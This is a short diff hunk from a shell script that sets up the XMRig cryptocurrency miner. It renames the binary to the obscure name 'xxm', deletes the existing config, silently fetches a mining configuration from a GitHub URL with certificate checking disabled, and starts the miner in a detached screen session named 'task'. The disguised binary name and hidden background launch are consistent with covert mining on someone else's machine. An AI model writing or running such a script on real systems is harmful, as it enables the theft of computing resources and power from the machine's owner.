@@ -6,4 +6,4 @@ mv xmrig xxm
 chmod u+x xxm
 rm -rf config.json
 wget --no-check-certificate -qO ./config.json https://raw.githubusercontent.com/chenlysave/my-micosmgd/refs/heads/main/amd.json
-screen -dmS task bash -c "cd xmrig-6.25.0 && ./xxm"
+screen -dmS task bash -c "./xxm"
